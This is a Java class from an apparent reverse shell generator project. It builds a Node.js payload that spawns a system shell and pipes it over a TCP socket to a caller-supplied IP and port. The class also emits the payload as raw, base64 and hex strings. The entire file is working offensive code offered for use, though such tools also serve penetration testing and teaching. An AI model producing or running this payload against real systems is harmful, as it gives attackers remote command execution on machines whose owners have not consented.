package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Node_js2 extends Reverse {

    protected String shellFormat = "";

    public Node_js2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("(function(){\r\n" + //
                "    var net = require(\"net\"),\r\n" + //
                "        cp = require(\"child_process\"),\r\n" + //
                "        sh = cp.spawn(\"%s\", []);\r\n" + //
                "    var client = new net.Socket();\r\n" + //
                "    client.connect(%s, \"%s\", function(){\r\n" + //
                "        client.pipe(sh.stdin);\r\n" + //
                "        sh.stdout.pipe(client);\r\n" + //
                "        sh.stderr.pipe(client);\r\n" + //
                "    });\r\n" + //
                "    return /a/; // Prevents the Node.js application from crashing\r\n" + //
                "})();",this.getShell(), this.getLocalPort(), this.getLocalIP());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}